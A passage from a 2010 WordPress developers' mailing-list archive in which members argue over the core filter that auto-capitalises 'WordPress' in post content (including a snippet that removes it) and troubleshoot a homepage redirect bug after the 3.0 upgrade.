> cons (principle of editing content, etc) and ask the people.
> WordPress is all about the community, this list isn't a good sample of
> that community (because we're all much more technically savvy than a
> lot of the users).
>
> Ask the question, get the answer, act on it, and problem solved.
>
> ~Mitch
>
> On Tue, Jul 6, 2010 at 9:42 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
> >> I'm really not trying to be difficult! I just think this filter is a
> > terrible idea.
> > +1 :)
> >
> > _Ryan McCue
> >> If you're on this list, you should at least be able to do that.
> >
> > Yes I know! And various people have offered a patch to fix this bug, but
> > Matt/Core Team reckon it isn't open to discussion. That's what people
> > are getting so worked up about here ...
> >
> > The function is broke. It needs a fix commiting to core code. Like I
> > said before - end of topic as far as I'm concerned.
> >
> > _ mccormicky
> >> Isn't that true? So how can it change filenames? Anyway why are you
> > using uppercase for filenames? This is stupid!
> >
> > Don't know where to begin on this ....
> >
> > Firstly this filter does affect URI paths, it affects all/any content
> > put into the "editable" content area.
> >
> > Secondly, with the filter, it would now look for a file called
> > "filename-WordPress.jpg" - making it capitalised whereas before it
> > wouldn't have been (so the filter is actually causing the capitals when
> > you just said you hated capitals).
> >
> > Thirdly, on a Linux box there is many good reasons why to use case in
> > file-names, not least readability when you have several hundred files in
> > a folder.
> >
> > Finally, what bit is stupid?
> >
> > Gav
> >
> >
> > -----Original Message-----
> > From: wp-hackers-bounces at lists.automattic.com
> > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harry
> > Metcalfe
> > Sent: 06 July 2010 15:33
> > To: wp-hackers at lists.automattic.com
> > Subject: Re: [wp-hackers] Putting the P in WordPress
> >
> > I wrote a patch weeks ago to take it out. I'm really not trying to be
> > difficult! I just think this filter is a terrible idea. And it's a
> > little sad to witness the total lack of interest from the core team.
> > This isn't how it's supposed to work, IMO.
> >
> >
> >
> > On 06/07/10 15:17, Ryan McCue wrote:
> >> Matt Mullenweg wrote:
> >>> If someone made a better version of the function and benchmarked it
> >>> next to the current or some of our other formatting functions in some
> >>> real-world situations, that would be useful too, and add to the
> >>> discussion rather than the noise. I'd love to see wp-hackers return
> > to
> >>> more, well, hacking.
> >>>
> >>
> >> I'm staying out of the discussion apart for this reason. I'm not on
> > this
> >> list because I want to hear people bikeshedding irrelevant stuff like
> >> this, I'm here because I want to participate in discussions about
> >> hacking WordPress.
> >>
> >> Also, if the functionality is really that broken (affecting URLs,
> > etc),
> >> write a patch and fix it yourselves. If you're on this list, you
> > should
> >> at least be able to do that.
> >>
> >
> > --
> > Harry Metcalfe
> > Tel: 07790 559 876
> > Web: http://thedextrousweb.com
> > Twitter: @harrym, @dextrousweb
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Mitch Canter
> studionashvegas
> http://www.studionashvegas.com
> 615-512-2838
>
> Find me on Twitter! http://www.studionashvegas.com
>
> I only check email 2-3 times a day, but if you don't hear back in
> 24hr, let me know.? Thanks!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From Gavin.Pearce at 3seven9.com  Tue Jul  6 15:13:03 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 16:13:03 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinun6tLFjfdnGDlYojb69tRJTZWFD-rD79EzDYL@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com><AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com><4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com><4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com><AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com><C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com><4C32AEE0.5070803@mullenweg.com>
	<4C333B03.8010603@rotorised.com><4C333EAD.8080508@thedextrousweb.com><CD47955B7E065D48AB5CF226C2ED75C02E2FB8@tbs-sbs01.TBS.local>
	<AANLkTinun6tLFjfdnGDlYojb69tRJTZWFD-rD79EzDYL@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FBB@tbs-sbs01.TBS.local>

> Ask the question, get the answer, act on it, and problem solved.

Fully agree. In that order.

Not: act on it, ignore the problem, pretend it goes away and send
arrogant answers to people who disagree.

Which is what has become the case here.

G


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mitch
Canter
Sent: 06 July 2010 15:52
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

The core argument here is whether or not people would be OK with their
blogging software having the ability to edit content (even if it's
just changing the spelling) without their permission.  Why not ask the
community?  A poll, a blog post, anything could be done where you
simply ask the question:

Would you mind if WordPress put code in your software that would
autocorrect the spelling of the word WordPress?

Explain why (branding reasons, continuity) and have someone draft the
cons (principle of editing content, etc) and ask the people.
WordPress is all about the community, this list isn't a good sample of
that community (because we're all much more technically savvy than a
lot of the users).

Ask the question, get the answer, act on it, and problem solved.

~Mitch

On Tue, Jul 6, 2010 at 9:42 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>
wrote:
>> I'm really not trying to be difficult! I just think this filter is a
> terrible idea.
> +1 :)
>
> _Ryan McCue
>> If you're on this list, you should at least be able to do that.
>
> Yes I know! And various people have offered a patch to fix this bug,
but
> Matt/Core Team reckon it isn't open to discussion. That's what people
> are getting so worked up about here ...
>
> The function is broke. It needs a fix commiting to core code. Like I
> said before - end of topic as far as I'm concerned.
>
> _ mccormicky
>> Isn't that true? So how can it change filenames? Anyway why are you
> using uppercase for filenames? This is stupid!
>
> Don't know where to begin on this ....
>
> Firstly this filter does affect URI paths, it affects all/any content
> put into the "editable" content area.
>
> Secondly, with the filter, it would now look for a file called
> "filename-WordPress.jpg" - making it capitalised whereas before it
> wouldn't have been (so the filter is actually causing the capitals
when
> you just said you hated capitals).
>
> Thirdly, on a Linux box there is many good reasons why to use case in
> file-names, not least readability when you have several hundred files
in
> a folder.
>
> Finally, what bit is stupid?
>
> Gav
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harry
> Metcalfe
> Sent: 06 July 2010 15:33
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> I wrote a patch weeks ago to take it out. I'm really not trying to be
> difficult! I just think this filter is a terrible idea. And it's a
> little sad to witness the total lack of interest from the core team.
> This isn't how it's supposed to work, IMO.
>
>
>
> On 06/07/10 15:17, Ryan McCue wrote:
>> Matt Mullenweg wrote:
>>> If someone made a better version of the function and benchmarked it
>>> next to the current or some of our other formatting functions in
some
>>> real-world situations, that would be useful too, and add to the
>>> discussion rather than the noise. I'd love to see wp-hackers return
> to
>>> more, well, hacking.
>>>
>>
>> I'm staying out of the discussion apart for this reason. I'm not on
> this
>> list because I want to hear people bikeshedding irrelevant stuff like
>> this, I'm here because I want to participate in discussions about
>> hacking WordPress.
>>
>> Also, if the functionality is really that broken (affecting URLs,
> etc),
>> write a patch and fix it yourselves. If you're on this list, you
> should
>> at least be able to do that.
>>
>
> --
> Harry Metcalfe
> Tel: 07790 559 876
> Web: http://thedextrousweb.com
> Twitter: @harrym, @dextrousweb
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From harry at thedextrousweb.com  Tue Jul  6 15:15:49 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Tue, 06 Jul 2010 16:15:49 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FBB@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com><AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com><4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com><4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com><AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com><C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com><4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com><4C333EAD.8080508@thedextrousweb.com><CD47955B7E065D48AB5CF226C2ED75C02E2FB8@tbs-sbs01.TBS.local>	<AANLkTinun6tLFjfdnGDlYojb69tRJTZWFD-rD79EzDYL@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FBB@tbs-sbs01.TBS.local>
Message-ID: <4C3348A5.5030701@thedextrousweb.com>

Agreed. If a sensibly designed survey says people don't care or think 
it's good I'll totally stfu.

Harry


On 06/07/10 16:13, Gavin Pearce wrote:
>> Ask the question, get the answer, act on it, and problem solved.
>
> Fully agree. In that order.
>
> Not: act on it, ignore the problem, pretend it goes away and send
> arrogant answers to people who disagree.
>
> Which is what has become the case here.
>
> G
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mitch
> Canter
> Sent: 06 July 2010 15:52
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> The core argument here is whether or not people would be OK with their
> blogging software having the ability to edit content (even if it's
> just changing the spelling) without their permission.  Why not ask the
> community?  A poll, a blog post, anything could be done where you
> simply ask the question:
>
> Would you mind if WordPress put code in your software that would
> autocorrect the spelling of the word WordPress?
>
> Explain why (branding reasons, continuity) and have someone draft the
> cons (principle of editing content, etc) and ask the people.
> WordPress is all about the community, this list isn't a good sample of
> that community (because we're all much more technically savvy than a
> lot of the users).
>
> Ask the question, get the answer, act on it, and problem solved.
>
> ~Mitch
>
> On Tue, Jul 6, 2010 at 9:42 AM, Gavin Pearce<Gavin.Pearce at 3seven9.com>
> wrote:
>>> I'm really not trying to be difficult! I just think this filter is a
>> terrible idea.
>> +1 :)
>>
>> _Ryan McCue
>>> If you're on this list, you should at least be able to do that.
>>
>> Yes I know! And various people have offered a patch to fix this bug,
> but
>> Matt/Core Team reckon it isn't open to discussion. That's what people
>> are getting so worked up about here ...
>>
>> The function is broke. It needs a fix commiting to core code. Like I
>> said before - end of topic as far as I'm concerned.
>>
>> _ mccormicky
>>> Isn't that true? So how can it change filenames? Anyway why are you
>> using uppercase for filenames? This is stupid!
>>
>> Don't know where to begin on this ....
>>
>> Firstly this filter does affect URI paths, it affects all/any content
>> put into the "editable" content area.
>>
>> Secondly, with the filter, it would now look for a file called
>> "filename-WordPress.jpg" - making it capitalised whereas before it
>> wouldn't have been (so the filter is actually causing the capitals
> when
>> you just said you hated capitals).
>>
>> Thirdly, on a Linux box there is many good reasons why to use case in
>> file-names, not least readability when you have several hundred files
> in
>> a folder.
>>
>> Finally, what bit is stupid?
>>
>> Gav
>>
>>
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harry
>> Metcalfe
>> Sent: 06 July 2010 15:33
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] Putting the P in WordPress
>>
>> I wrote a patch weeks ago to take it out. I'm really not trying to be
>> difficult! I just think this filter is a terrible idea. And it's a
>> little sad to witness the total lack of interest from the core team.
>> This isn't how it's supposed to work, IMO.
>>
>>
>>
>> On 06/07/10 15:17, Ryan McCue wrote:
>>> Matt Mullenweg wrote:
>>>> If someone made a better version of the function and benchmarked it
>>>> next to the current or some of our other formatting functions in
> some
>>>> real-world situations, that would be useful too, and add to the
>>>> discussion rather than the noise. I'd love to see wp-hackers return
>> to
>>>> more, well, hacking.
>>>>
>>>
>>> I'm staying out of the discussion apart for this reason. I'm not on
>> this
>>> list because I want to hear people bikeshedding irrelevant stuff like
>>> this, I'm here because I want to participate in discussions about
>>> hacking WordPress.
>>>
>>> Also, if the functionality is really that broken (affecting URLs,
>> etc),
>>> write a patch and fix it yourselves. If you're on this list, you
>> should
>>> at least be able to do that.
>>>
>>
>> --
>> Harry Metcalfe
>> Tel: 07790 559 876
>> Web: http://thedextrousweb.com
>> Twitter: @harrym, @dextrousweb
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>

-- 
Harry Metcalfe
Tel: 07790 559 876
Web: http://thedextrousweb.com
Twitter: @harrym, @dextrousweb

From ravi-lists at g8o.net  Tue Jul  6 15:35:37 2010
From: ravi-lists at g8o.net ( ravi )
Date: Tue, 6 Jul 2010 11:35:37 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinUcWyJyKdIw0eqNdg2jofyj5FtBqRgtbc3k4yq@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net>
	<AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local>
	<af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>
	<AANLkTinUcWyJyKdIw0eqNdg2jofyj5FtBqRgtbc3k4yq@mail.gmail.com>
Message-ID: <850696F9-E5E8-4C90-8AF6-187D22296776@g8o.net>

On Jul 6, 2010, at 9:46 AM, Frank Bueltge wrote:
> +100 :)
> 
> i include in all my blogs:
> function remove_default_filter() {
>    // Remove Format WordPress
>    foreach ( array( 'the_content', 'the_title', 'comment_text' ) as $filter
> ) {
>        remove_filter( $filter, 'capital_P_dangit' );
>    }
> }
> if ( !is_admin() )
>    add_action('init', ?remove_default_filter?)
> ;
> 

> On Tue, Jul 6, 2010 at 3:43 PM, 24/7 <24-7 at gmx.net> wrote:
> 
>> Couldn' we just stop the discussion about the "P" and simply make the
>> package complete: check for the correct spelling of "Matt, Automattic
>> & Mullenweg" too?
>> 
>> To be serious: Why not make this optional? Just a yes/no-redio or
>> checkbox in the Admin-UI. Everybody would be satisfied.



A word of warning: code and UI bloat, except when added on an individual basis (such as the above) are something to be wary of.

So, no, we can never make everybody satisfied ;-). In this case (adding a UI option), I would whine.

	?ravi



From ravi-lists at g8o.net  Tue Jul  6 15:42:18 2010
From: ravi-lists at g8o.net ( ravi )
Date: Tue, 6 Jul 2010 11:42:18 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinkfC7skDGnMm2UGY6E3teku1Rccfmdjhp9Mssv@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
	<AANLkTinkfC7skDGnMm2UGY6E3teku1Rccfmdjhp9Mssv@mail.gmail.com>
Message-ID: <9A475466-29E7-4092-9D79-7855636EE677@g8o.net>

On Jul 6, 2010, at 6:14 AM, Ben Huson wrote:
> 1. You cannot write "You spell it WordPress not Wordpress" (If you
> want to write this you probably know or can find out how to remove the
> filter)


I am curious: what is the answer that has been offered to the above issue (assuming someone ? Matt or someone else -- has answered it). Apologies if it?s all in Trac. The parenthetical response (above) doesn?t quite cut it, IMHO.

Ignoring for the moment the above concern, I see two threads in play here? there is no disagreement, as far as I can tell, that WordPress should be spelled ?WordPress?. And despite the claims that large numbers of WordPress enthusiasts are rioting in the streets, Matt?s challenge that they vote with their feet is likely not too bold a gamble. So, arguably, there is no issue with the content of the correction, nor is this turning out to be a matter of great importance for the WP community (at large).

On the other hand, the objections seem to be philosophical (and some of it of the slippery slope variety). Irrespective of its popularity, the argument goes, this is just a bad idea, both in terms of tinkering with a user?s content and in terms of how such acts are carried out. Trademark protection is an unconvincing reason (both because it is being carried out here in a preventive ? or ?preventative? if you prefer -- manner, and also because free speech issues should ? and do? ? trump trademark worries).

For whatever I am worth, I must admit to being swayed by the philosophical argument. I think this bit of ?corrective? code is likely nothing more than one or a few deeply vested Core developers indulging in scratching a pet itch. However, since I am unmoved by slippery slope arguments (and since I think the issue quoted about regarding spelling is rare and can be addressed in more ? admittedly roundabout ? ways), I am willing to grant them that and reserve my wrath for when they start replacing ?GNU/Linux? with ?Linux? (not vice versa!). YMMV.

	?ravi


From mailapera at gmail.com  Tue Jul  6 16:27:18 2010
From: mailapera at gmail.com (mailapera)
Date: Tue, 6 Jul 2010 18:27:18 +0200
Subject: [wp-hackers] Home redirects to new page on WP 3.0
Message-ID: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>

Hi, I am posting here as I can't get any help on the forums.

I installed 3.0 and after creating a new page, additional to those I
already had prior to the upgrade to 3.0, my homepage redirects to that
newly created page with a 301 permanent redirect. If I delete the page
the redirect stays and produces a 404 error each time I try to visit
the homepage. To eliminate the error I have to go in the DB and delete
the 301 entry.

I also tried creating multiple new pages. The result is that after
deleting from the DB the oldest page (of the newly created ones) the
redirect moves to the next newly created page in line. So I cannot
create any new page.

I tried disabling all plugins and the error is still in place. I have
no idea what produces it.

Thanks for any help

From mccormicky at gmail.com  Tue Jul  6 16:40:31 2010
From: mccormicky at gmail.com (mccormicky)
Date: Tue, 6 Jul 2010 12:40:31 -0400
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>
Message-ID: <AANLkTikZzwHe-bO8Wre9K6ydDHDN2L1gNpdKX_6RHuYj@mail.gmail.com>

I have questions about your error:
what is the slug of the new page?
Have you tried updating permalinks ?
Do you have other code in .htaccess besides what WP inserts?
what permalink structure are you using?
are all your pages redirecting or just the new one?
when you put in your site's address are you directed to the new page?

And finally if you load the twentyten theme does this still happen?

On Tue, Jul 6, 2010 at 12:27 PM, mailapera <mailapera at gmail.com> wrote:

> Hi, I am posting here as I can't get any help on the forums.
>
> I installed 3.0 and after creating a new page, additional to those I
> already had prior to the upgrade to 3.0, my homepage redirects to that
> newly created page with a 301 permanent redirect. If I delete the page
> the redirect stays and produces a 404 error each time I try to visit
> the homepage. To eliminate the error I have to go in the DB and delete
> the 301 entry.
>
> I also tried creating multiple new pages. The result is that after
> deleting from the DB the oldest page (of the newly created ones) the
> redirect moves to the next newly created page in line. So I cannot
> create any new page.
>
> I tried disabling all plugins and the error is still in place. I have
> no idea what produces it.
>
> Thanks for any help
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mark at simplercomputing.net  Tue Jul  6 16:45:49 2010
From: mark at simplercomputing.net (Mark E)
Date: Tue, 06 Jul 2010 10:45:49 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C32AEE0.5070803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
Message-ID: <4C335DBD.4020802@simplercomputing.net>



On 07/05/2010 10:19 PM, Matt Mullenweg wrote:

> As I said before, you are in /complete control/ of your site. It's a
> single line to remove a filter. If you don't like the filter, vote with
> your feet or with a plugin.

How about making that function into a plugin that people have to enable 
- like Akismet? Seems like a more reasonable solution that forcing 
people to get rid of it by adding a plugin.

Mark

From mailapera at gmail.com  Tue Jul  6 17:00:24 2010
From: mailapera at gmail.com (mailapera)
Date: Tue, 6 Jul 2010 19:00:24 +0200
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTikZzwHe-bO8Wre9K6ydDHDN2L1gNpdKX_6RHuYj@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com> 
	<AANLkTikZzwHe-bO8Wre9K6ydDHDN2L1gNpdKX_6RHuYj@mail.gmail.com>
Message-ID: <AANLkTimhMMnsy97otZdNU5chMKGjMpaClVbsnVo5CoFk@mail.gmail.com>

Hi,

> what is the slug of the new page?
I just created a new page and the error is producing. The slug is URL
is http://experience-tuscany.thriftytuscany.com/experience-tuscany

> Have you tried updating permalinks ?
Yes, I have set them to default then to custom again

> Do you have other code in .htaccess besides what WP inserts?
I seem to have the plain one

# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress

> what permalink structure are you using?
/%postname%/%post_id%

> are all your pages redirecting or just the new one?
Only the new one

> when you put in your site's address are you directed to the new page?
Yes

> And finally if you load the twentyten theme does this still happen?
Yes

Thanks for your help. Right now if you go to the blog you will see it
is all messed up




On Tue, Jul 6, 2010 at 6:40 PM, mccormicky <mccormicky at gmail.com> wrote:
> I have questions about your error:
> what is the slug of the new page?
> Have you tried updating permalinks ?
> Do you have other code in .htaccess besides what WP inserts?
> what permalink structure are you using?
> are all your pages redirecting or just the new one?
> when you put in your site's address are you directed to the new page?
>
> And finally if you load the twentyten theme does this still happen?
>
> On Tue, Jul 6, 2010 at 12:27 PM, mailapera <mailapera at gmail.com> wrote:
>
>> Hi, I am posting here as I can't get any help on the forums.
>>
>> I installed 3.0 and after creating a new page, additional to those I
>> already had prior to the upgrade to 3.0, my homepage redirects to that
>> newly created page with a 301 permanent redirect. If I delete the page
>> the redirect stays and produces a 404 error each time I try to visit
>> the homepage. To eliminate the error I have to go in the DB and delete
>> the 301 entry.
>>
>> I also tried creating multiple new pages. The result is that after
>> deleting from the DB the oldest page (of the newly created ones) the
>> redirect moves to the next newly created page in line. So I cannot
>> create any new page.
>>
>> I tried disabling all plugins and the error is still in place. I have
>> no idea what produces it.
>>
>> Thanks for any help
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mark at simplercomputing.net  Tue Jul  6 17:04:36 2010
From: mark at simplercomputing.net (Mark E)
Date: Tue, 06 Jul 2010 11:04:36 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
Message-ID: <4C336224.907@simplercomputing.net>


> As has been pointed out on this thread, WordPress is a trademark, and as
> such *must* be actively protected, otherwise the trademark status will be
> lost.

If that really were a valid reason then there'd be a load of take down 
notices for the numerous domains that include the series of letters 
"wordpress"

And, since "WordPress" is trademarked as a "standard character mark" 
(#78826734 at uspto.gov) then that essentially protects "wordpress" in 
any font, style, mix of case, etc.

Mark


From m at mullenweg.com  Tue Jul  6 17:16:59 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 13:16:59 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net><001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com><4C32AEE0.5070803@mullenweg.com>	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
Message-ID: <4C33650B.2020306@mullenweg.com>

On 7/6/2010 5:32 AM, Gavin Pearce wrote:
> That
> said, you clearly have time spare for snide remarks yourself though?

Not really. :/

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 17:18:10 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 13:18:10 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinkfC7skDGnMm2UGY6E3teku1Rccfmdjhp9Mssv@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
